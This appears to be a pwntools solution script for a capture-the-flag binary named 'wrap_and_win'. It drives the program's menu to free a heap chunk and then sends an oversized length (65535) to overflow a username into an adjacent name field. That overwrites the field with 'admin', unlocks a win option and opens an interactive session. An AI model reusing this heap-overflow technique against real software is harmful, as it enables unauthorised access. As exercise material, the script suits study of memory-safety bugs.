from pwn import *
import pathlib, os

context.terminal = ["new"]

DEBUG = False
binaries = Path(pathlib.Path(__file__).parent.parent.resolve()) / "binaries"
data = Path(pathlib.Path(__file__).parent.parent.resolve()) / "data"

if not DEBUG: 
    p = process(str(binaries) + "/wrap_and_win")
else:
    p = gdb.debug(str(binaries) + "/wrap_and_win", '''
       continue
    ''')

# allocate first chunk on heap, dummy username
p.recvuntil(b"> ")
p.send(b"1\n")
p.recvuntil(b"> ")
p.send(b"4\n")
p.recvuntil(b"> ")
p.send(b"A\n")
p.recvuntil(b"> ")

# allocate name, fixed size, to be overflowed
p.send(b"2\n")
p.recvuntil(b"> ")
p.send(b"root\n")
p.recvuntil(b"> ")

# free username, frees MIN_SIZE chunk preceding name
p.send(b"3\n")
p.recvuntil(b"> ")

# overflow username by sending MAX_SHORT size for username
p.send(b"1\n")
p.recvuntil(b"> ")
p.send(b"65535\n")
p.recvuntil(b"> ")
p.send(b"A" * 32 + b"admin\n")
p.recvuntil(b"> ")

# win
p.send(b"6\n")
p.interactive()

# write output to file
f = open(str(data) + "/input.bin", "wb")
f.write(b"1\n4\nA\n2\nroot\n3\n1\n65535\n")
f.write(b"A" * 32 + b"admin\n6\n")
f.close()
